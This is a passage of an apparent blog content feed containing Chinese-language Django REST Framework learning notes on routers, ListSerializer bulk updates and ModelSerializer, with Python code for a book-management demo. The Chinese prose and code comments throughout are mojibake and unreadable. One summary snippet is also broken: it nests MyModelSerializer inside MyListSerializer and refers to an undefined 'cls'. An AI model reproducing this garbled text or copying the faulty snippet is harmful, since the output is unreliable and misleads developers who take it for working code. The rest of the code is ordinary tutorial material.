ÊâÄÊúâË∑ØÁî±‰∏éViewSetËßÜÂõæÁ±ªÁöÑÈÉΩÂèØ‰ª•Ê≥®ÂÜåÔºå‰ºö‰∫ßÁîü 'v7/books/' Âíå 'v7/books/&lt;pk&gt;/'</span></span><br><span class="line">router.register(<span class="string">'v7/books'</span>, views.BookModelViewSet)</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># router.urlsÊ∑ªÂä†ÊñπÊ≥ï‰∏Ä</span></span><br><span class="line">    <span class="comment"># path('', include(router.urls)),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># router.urlsÊ∑ªÂä†ÊñπÊ≥ï‰∫å</span></span><br><span class="line"><span class="comment"># urlpatterns += router.urls</span></span><br></pre></td></tr></table></figure><h1 id="ÊÄªÁªì">ÊÄªÁªì</h1><p>‰∏ÄÂõæËÉúÂçÉË®ÄÔºåÈùûÂéüÂàõÔºåÂùáÊù•Ëá™ÁΩëÁªúÔºö</p><img src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/1.png" class="" title="Âõæ1"><img src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/2.jpg" class="" title="Âõæ2">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞Ôºà‰πùÔºâÔºöÂ∫èÂàóÂåñÊ®°Âùó serialziers ‰πã ListSerializerÁ±ª</title>
      <link href="/tech/drf-learning-notes-9-the-listserializer-class-in-serialziers-module/"/>
      <url>/tech/drf-learning-notes-9-the-listserializer-class-in-serialziers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (9): the ListSerializer class in serialziers module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guide - Serializers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guide - Serializer fields<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guide - Serializer relations<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzlfZHJmX0xpc3RTZXJpYWxpemVy">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><p>DRFÂ∏∏Áî®Â∫èÂàóÂåñÁ±ª‰∏ªË¶ÅÊúâ</p><ul><li><code>rest_framework.serialziers.Serializer</code></li><li><code>rest_framework.serialziers.ModelSerializer</code></li><li><code>rest_framework.serialziers.ListSerializer</code></li></ul><p>Êú¨ÁØá‰ªãÁªç<code>rest_framework.serialziers.ListSerializer</code>ÔºåÂ∞ÜÁªßÁª≠‰ª•Âõæ‰π¶ÁÆ°ÁêÜÁ≥ªÁªüÂÆû‰æãËØ¥Êòé„ÄÇ</p><a id="more"></a><h1 id="‰ΩøÁî®Âú∫ÊôØ‰πãÁæ§ÊîπÁæ§Â¢ûÁæ§Êîπ">‰ΩøÁî®Âú∫ÊôØ‰πãÁæ§ÊîπÁæ§Â¢ûÁæ§Êîπ</h1><p>ÂΩì‰∏Ä‰∏™Â∫èÂàóÂåñÂô®Âú®Â∏¶Êúâ<code>many=True</code>ÈÄâÈ°πË¢´Â∫èÂàóÂåñÊó∂ÔºåÂ∞ÜÂàõÂª∫‰∏Ä‰∏™<code>ListSerializer</code>ÂÆû‰æãÔºåËØ•Â∫èÂàóÂåñÂô®Á±ªÂ∞ÜÊàê‰∏∫<code>ListSerializer</code>Á±ªÁöÑÂ≠êÁ±ª„ÄÇ ÂΩì‰Ω†ÈúÄË¶ÅËá™ÂÆö‰πâÂ§ö‰∏™ÂØπË±°ÁöÑË°å‰∏∫Êó∂ÔºàÊØîÂ¶ÇÁæ§Â¢ûÔºåÁæ§ÊîπÔºâ,‰Ω†ÈúÄË¶ÅÊâãÂä®ÂÆöÂà∂<code>ListSerializer</code>Á±ªÁöÑ‰∏Ä‰∫õË°å‰∏∫„ÄÇ ÂèØ‰ª•ÈÄöËøáÂú®Ëá™ÂÆö‰πâÂ∫èÂàóÂåñÂô®ÁöÑ<code>Meta</code>Á±ª‰∏ãÈù¢ÁöÑ<code>list_serializer_class</code>Êù•ÁªëÂÆö‰Ω†ÈúÄË¶ÅÁöÑÁöÑ<code>ListSerializer</code>Á±ª</p><h1 id="Á§∫‰æã‰ª£Á†Å">Á§∫‰æã‰ª£Á†Å</h1><p>Áæ§ÊîπÈúÄË¶ÅËÆæÁΩÆ<code>ListSerializer</code>ÔºåÂàõÂª∫<code>BookListSerializer</code>ÁªßÊâø<code>ListSerializer</code>ÔºåÈáçÂÜô<code>update</code>ÊñπÊ≥ï</p><h2 id="Â∫èÂàóÂåñÂ±Ç-serializer.py">Â∫èÂàóÂåñÂ±Ç <code>serializer.py</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÈáçÁÇπÔºöListSerializer‰∏éModelSerializerÂª∫Á´ãÂÖ≥ËÅîÁöÑÊòØÔºö Âú®ModelSerializerÁöÑMetaÁ±ª‰∏≠ËÆæÁΩÆ   list_serializer_class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span>  <span class="comment"># print(instance)  # Ë¶ÅÊõ¥Êñ∞ÁöÑÂØπË±°‰ª¨</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # Êõ¥Êñ∞ÁöÑÂØπË±°ÂØπÂ∫îÁöÑÊï∞ÊçÆ‰ª¨</span></span><br><span class="line">        <span class="comment"># print(self.child)  # ÊúçÂä°ÁöÑÊ®°ÂûãÂ∫èÂàóÂåñÁ±ª - V3BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V3BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            <span class="comment"># Áæ§ÊîπÔºålist_serializer_classÊòØÂõ∫ÂÆöÁöÑkeyÂÜôÊ≥ïÔºåÁõ¥Êé•ËΩ¨ÂÖ•BookListSerializerÁ±ªÁöÑ update ÊñπÊ≥ï</span></span><br><span class="line">            list_serializer_class = BookListSerializer</span><br></pre></td></tr></table></figure><p>‰πãÊâÄ‰ª•ÈúÄË¶ÅÂÆûÁé∞<code>update</code>ÊñπÊ≥ïÔºåÁæ§ÊîπÊó∂‰ºöËµ∞ <code>rest_framework.serializers.ListSerializer</code>‰∏≠ÁöÑ<code>update</code>ÂáΩÊï∞ÔºåËÄåËØ•ÂáΩÊï∞Âπ∂Êú™Ë¢´ÂÆûÁé∞„ÄÇ</p><p>ËÄåÁæ§Â¢û‰∏çÈúÄË¶ÅÈáçÂÜô<code>create</code>ÊñπÊ≥ïÔºåÂõ†‰∏∫Ê∫êÁ†Å‰∏≠<code>rest_framework.serializers.ListSerializer</code>Ëµ∞ÁöÑÂ∞±ÊòØ<code>ModelSerializer</code>ÁöÑ<code>create</code>ÊñπÊ≥ï:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        self.child.create(attrs) <span class="keyword">for</span> attrs <span class="keyword">in</span> validated_data</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h2 id="ËßÜÂõæÂ±Ç-views.py">ËßÜÂõæÂ±Ç <code>views.py</code></h2><p>Âú®ËßÜÂõæÂ±ÇÂ∞Ü ÂçïÂ±ÄÈÉ®ÊîπÂíåÁæ§Â±ÄÈÉ®ÊîπÊï¥ÂêàÔºåÊÄùË∑ØÂ¶Ç‰∏ãÔºö</p><ol type="1"><li>ÂçïÂ±ÄÈÉ®ÊîπÔºöÂØπ <code>v3/books/pk/</code> <code>pk</code>ÈÄöËøáË∑ØÁî±‰º†ÂèÇÔºå‰øÆÊîπÊï∞ÊçÆÈÄâÊã©‰º†ÂèÇÔºåÈÄöËøáÊï∞ÊçÆÂåÖjson‰º†ÈÄí</li><li>Áæ§Â±ÄÈÉ®‰øÆÊîπÔºö<code>v3/books/</code> ‰øÆÊîπÊï∞ÊçÆÈÄöËøáÊï∞ÊçÆÂåÖ‰º†ÈÄíÔºåËÆæÁΩÆÊàêÂàóË°®Ê†ºÂºè <code>[{pk:1,name:123},{pk:3,price:7},{pk:7,publish:2}]</code></li><li>ÂÖàÂ∞ÜÂçïÊîπÔºåÁæ§ÊîπÁöÑÊï∞ÊçÆÈÉΩÊ†ºÂºèÂåñÊàê <code>pks=[Ë¶ÅÈúÄË¶ÅÁöÑÂØπË±°‰∏ªÈîÆÊ†áËØÜ]</code>Ôºå <code>request_data=[ÊØè‰∏™Ë¶Å‰øÆÊîπÁöÑÂØπË±°ÂØπÂ∫îÁöÑ‰øÆÊîπÊï∞ÊçÆ]</code></li><li><code>pks</code>‰∏é<code>request_data</code>Êï∞ÊçÆÁ≠õÈÄâÔºåÂ∞Ü<code>pks</code>‰∏≠ÁöÑÊ≤°ÊúâÂØπÂ∫îÊï∞ÊçÆÁöÑ<code>pk</code>‰∏éÊï∞ÊçÆÂ∑≤Âà†Èô§ÁöÑ<code>pk</code>ÁßªÈô§Ôºå<code>request_data</code>ÂØπÂ∫îÁ¥¢Âºï‰Ωç‰∏äÁöÑÊï∞ÊçÆ‰πüÁßªÈô§ÔºåÂ∞ÜÂêàÁêÜÁöÑ<code>pks</code>ËΩ¨Êç¢‰∏∫<code>objs</code></li></ol><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models, serializers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V3Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># ÂçïÂ±ÄÈÉ®ÊîπÂíåÁæ§Â±ÄÈÉ®ÊîπÊï¥Âêà</span></span><br><span class="line">    <span class="comment"># ÂçïÂ±ÄÈÉ®ÊîπÔºöÂØπ v3/books/pk/   pkÈÄöËøáË∑ØÁî±‰º†ÂèÇÔºå‰øÆÊîπÊï∞ÊçÆÈÄâÊã©‰º†ÂèÇÔºåÈÄöËøáÊï∞ÊçÆÂåÖjson‰º†ÈÄí</span></span><br><span class="line">    <span class="comment"># Áæ§Â±ÄÈÉ®‰øÆÊîπÔºöv3/books/ ‰øÆÊîπÊï∞ÊçÆÈÄöËøáÊï∞ÊçÆÂåÖ‰º†ÈÄíÔºåËÆæÁΩÆÊàêÂàóË°®Ê†ºÂºè  [&#123;pk:1,name:123&#125;,&#123;pk:3,price:7&#125;,&#123;pk:7,publish:2&#125;]</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        request_data = request.data  <span class="comment"># Êï∞ÊçÆÂåÖÊï∞ÊçÆ</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># Â∞ÜÂçïÊîπÔºåÁæ§ÊîπÁöÑÊï∞ÊçÆÈÉΩÊ†ºÂºèÂåñÊàê pks=[Ë¶ÅÈúÄË¶ÅÁöÑÂØπË±°‰∏ªÈîÆÊ†áËØÜ] | request_data=[ÊØè‰∏™Ë¶Å‰øÆÊîπÁöÑÂØπË±°ÂØπÂ∫îÁöÑ‰øÆÊîπÊï∞ÊçÆ]</span></span><br><span class="line">        <span class="keyword">if</span> pk <span class="keyword">and</span> isinstance(request_data, dict):  <span class="comment"># ÂçïÊîπ</span></span><br><span class="line">            pks = [pk, ]</span><br><span class="line">            request_data = [request_data, ]</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> pk <span class="keyword">and</span> isinstance(request_data, list):  <span class="comment"># Áæ§Êîπ</span></span><br><span class="line">            pks = []</span><br><span class="line">            <span class="comment"># ÈÅçÂéÜÂâçÂè∞Êï∞ÊçÆ[&#123;pk:1, name:123&#125;, &#123;pk:3, price:7&#125;, &#123;pk:7, publish:2&#125;]ÔºåÊãø‰∏Ä‰∏™‰∏™Â≠óÂÖ∏</span></span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> request_data:</span><br><span class="line">                pk = dic.pop(<span class="string">'pk'</span>, <span class="literal">None</span>)  <span class="comment"># ËøîÂõûpkÂÄº</span></span><br><span class="line">                <span class="keyword">if</span> pk:</span><br><span class="line">                    pks.append(pk)</span><br><span class="line">                <span class="comment"># pkÊ≤°Êúâ‰º†ÂÄº</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                        <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                        <span class="string">'msg'</span>: <span class="string">'ÂèÇÊï∞ÈîôËØØ'</span></span><br><span class="line">                    &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'ÂèÇÊï∞ÈîôËØØ'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="comment"># pks‰∏érequest_dataÊï∞ÊçÆÁ≠õÈÄâÔºå</span></span><br><span class="line">        <span class="comment"># 1ÔºâÂ∞Üpks‰∏≠ÁöÑÊ≤°ÊúâÂØπÂ∫îÊï∞ÊçÆÁöÑpk‰∏éÊï∞ÊçÆÂ∑≤Âà†Èô§ÁöÑpkÁßªÈô§Ôºårequest_dataÂØπÂ∫îÁ¥¢Âºï‰Ωç‰∏äÁöÑÊï∞ÊçÆ‰πüÁßªÈô§</span></span><br><span class="line">        <span class="comment"># 2ÔºâÂ∞ÜÂêàÁêÜÁöÑpksËΩ¨Êç¢‰∏∫ objs</span></span><br><span class="line">        objs = []</span><br><span class="line">        new_request_data = []</span><br><span class="line">        <span class="keyword">for</span> index, pk <span class="keyword">in</span> enumerate(pks):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Â∞ÜpkÂêàÁêÜÁöÑÂØπË±°Êï∞ÊçÆ‰øùÂ≠ò‰∏ãÊù•</span></span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                objs.append(book_obj)</span><br><span class="line">                <span class="comment"># ÂØπÂ∫îÁ¥¢ÂºïÁöÑÊï∞ÊçÆ‰πü‰øùÂ≠ò‰∏ãÊù•</span></span><br><span class="line">                new_request_data.append(request_data[index])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment"># ÈáçÁÇπÔºöÂèçÈù¢ÊïôÁ®ã - pkÂØπÂ∫îÁöÑÊï∞ÊçÆÊúâËØØÔºåÂ∞ÜÂØπÂ∫îÁ¥¢ÂºïÁöÑdata‰∏≠request_data‰∏≠ÁßªÈô§</span></span><br><span class="line">                <span class="comment"># Âú®forÂæ™ÁéØ‰∏≠‰∏çË¶Å‰ΩøÁî®Âà†Èô§</span></span><br><span class="line">                <span class="comment"># index = pks.index(pk)</span></span><br><span class="line">                <span class="comment"># request_data.pop(index)</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># ÁîüÊàê‰∏Ä‰∏™serializerÂØπË±°</span></span><br><span class="line">        book_ser = serializers.V3BookModelSerializer(</span><br><span class="line">            instance=objs, data=new_request_data, partial=<span class="literal">True</span>, many=<span class="literal">True</span>)</span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_objs = book_ser.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.V3BookModelSerializer(book_objs, many=<span class="literal">True</span>).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></details><h1 id="listserializer‰ΩøÁî®Ë¶ÅÁÇπÂ∞èÁªì"><code>ListSerializer</code>‰ΩøÁî®Ë¶ÅÁÇπÂ∞èÁªì</h1><p><code>views.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ser_obj = ModelSerializer(instance=model_obj,data=model_data,partial=<span class="literal">True</span>,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>serializer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># ÂÆûÁé∞Áæ§ÊîπÂäüËÉΩÔºåÂèçÂ∫èÂàóÂåñÊÉÖÂÜµ‰∏ãÁöÑcreate„ÄÅupdateÂ∞±‰∏çÂÜçË∞ÉÁî®ModelSerializerÁöÑ</span></span><br><span class="line"><span class="comment"># ËÄåÊòØË∞ÉÁî® ModelSerializer.Meta.list_serializer_class ÊåáÂêëÁöÑ ListSerializer Á±ªÁöÑcreate„ÄÅupdate</span></span><br><span class="line"><span class="comment"># ListSerializerÈªòËÆ§Âè™ÂÆûÁé∞‰∫ÜÁæ§Â¢ûÁöÑcreateÔºåË¶ÅÂÆûÁé∞Áæ§ÊîπÔºåÂøÖÈ°ªÈáçÂÜôupdate</span></span><br><span class="line"></span><br><span class="line">„ÄÄ„ÄÄ<span class="comment">#Ëá™ÂÆö‰πâÂ∫èÂàóÂåñÁ±ªÔºåÈáçÂÜôupdateÊñπÊ≥ï</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># print(instance)  # Ë¶ÅÊõ¥Êñ∞ÁöÑÂØπË±°‰ª¨: [obj1, obj2, ...]</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # Êõ¥Êñ∞ÁöÑÂØπË±°ÂØπÂ∫îÁöÑÊï∞ÊçÆ‰ª¨: [&#123;&#125;, &#123;&#125;, ...]</span></span><br><span class="line">        <span class="comment"># print(self.child)  # ÊúçÂä°ÁöÑÊ®°ÂûãÂ∫èÂàóÂåñÁ±ª - V2BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            list_serializer_class = MyListSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â∞Ü‰∏§ËÄÖÁ±ªÂª∫Á´ãÂÖ≥ËÅîÔºåÂú®MyListSerializer‰∏≠Â∞±ÂèØ‰ª•Áî®self.childÊãøÂà∞# MyModelSerializerÔºåËøõËÄå‰ΩøÁî®MyModelSerializer‰∏≠Â∞ÅË£ÖÂ•ΩÁöÑÊñπÊ≥ï</span></span><br><span class="line">    cls.Meta.list_serializer_class.child = cls</span><br></pre></td></tr></table></figure><h1 id="Ê∫êÁ†ÅË°•ÂÖÖÂàÜÊûê">Ê∫êÁ†ÅË°•ÂÖÖÂàÜÊûê</h1><p>ÂàÜÊûê‰∏Ä‰∏ã‰øÆÊîπ‰∏∫‰ªÄ‰πàË¶ÅÁî®<code>instance</code>‰º†ÂèÇ„ÄÇ</p><p>‰øÆÊîπ‰πãÂêéÊï∞ÊçÆ‰ΩøÁî®<code>save()</code>‰øùÂ≠òÔºå‰ªéËßÜÂõæÁöÑ<code>save()</code>ÁÇπÂáªËøõÂéªÊü•ÁúãÊ∫êÁ†ÅÔºå‰∏ãÈù¢ÊòØ<code>BaseSerializer</code>Á±ª‰∏≠ÁöÑ<code>save</code>ÔºåËÄåËØ•<code>save</code>Êú™Ë¢´ÂÆûÁé∞„ÄÇ</p><p>Âõ†Ê≠§Êé•ÁùÄÊü•Áúã<code>save</code>ÊñπÊ≥ïÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    validated_data = [</span><br><span class="line">        dict(list(attrs.items()) + list(kwargs.items()))</span><br><span class="line">        <span class="keyword">for</span> attrs <span class="keyword">in</span> self.validated_data</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        self.instance = self.update(self.instance, validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`update()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.instance = self.create(validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`create()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.instance</span><br></pre></td></tr></table></figure><p><code>instance</code>Â≠òÂú®Â∞±Ëµ∞<code>update</code>ÊñπÊ≥ïÔºå‰øÆÊîπÊï∞ÊçÆ(<code>PUT</code>/<code>PATCH</code>)Êó∂ÈÉΩÂ∫î‰º†ÂÖ•<code>instance</code>ÔºåÊâÄ‰ª•ÂçïÊîπÁæ§ÊîπÈÉΩÈúÄË¶Å‰º†ÂÖ•<code>data</code>ÔºàÂèçÂ∫èÂàóÂåñÁî®ÔºâÂíå<code>instance</code>ÔºàÂ∫èÂàóÂåñÁî®ÔºâÂèÇÊï∞„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂÖ´ÔºâÔºöÂ∫èÂàóÂåñÊ®°Âùó serialziers ‰πã ModelSerializerÁ±ª</title>
      <link href="/tech/drf-learning-notes-8-the-modelserializer-class-in-serialziers-module/"/>
      <url>/tech/drf-learning-notes-8-the-modelserializer-class-in-serialziers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guide - Serializers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guide - Serializer fields<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guide - Serializer relations<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzhfZHJmX01vZGVsU2VyaWFsaXplcg==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa 